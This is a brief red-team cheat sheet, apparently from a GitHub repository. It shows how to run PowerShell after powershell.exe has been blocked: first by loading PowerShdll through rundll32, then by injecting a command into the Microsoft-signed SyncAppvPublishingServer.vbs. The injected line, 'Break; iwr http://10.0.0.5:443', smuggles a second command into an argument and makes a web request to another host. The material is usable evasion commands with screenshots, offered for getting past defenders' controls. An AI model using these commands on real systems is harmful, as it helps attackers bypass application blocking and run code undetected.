# Powershell Without Powershell.exe
`Powershell.exe` is just a process hosting the `System.Management.Automation.dll` which essentially is the actual Powershell as we know it.

If you run into a situation where `powershell.exe` is **blocked** and no strict application whitelisting is implemented, there are ways to execute powershell still.

### PowerShdll

* [PowerShdll](https://github.com/p3nt4/PowerShdll)
  
```cmd
rundll32.exe PowerShdll.dll,main
```

![pwshll-rundll32](https://github.com/Mehdi0x90/Red-Team/assets/17106836/cb3c623f-1eb5-44ea-9931-d6fdadbb0e3e)

> Note that the same could be achieved with a compiled `.exe` binary from the same project, but keep in mind that `.exe` is more likely to run into whitelisting issues.

### SyncAppvPublishingServer
Windows 10 comes with `SyncAppvPublishingServer.exe` and `SyncAppvPublishingServer.vbs` that can be abused with code injection to execute powershell commands from a Microsoft signed script:

```cmd
SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```

![1](https://github.com/Mehdi0x90/Red-Team/assets/17106836/244b9897-44d2-4799-aa52-301b5c4bcc4e)

![2](https://github.com/Mehdi0x90/Red-Team/assets/17106836/ec008e9c-e047-4610-8477-696e617feb25)
























































































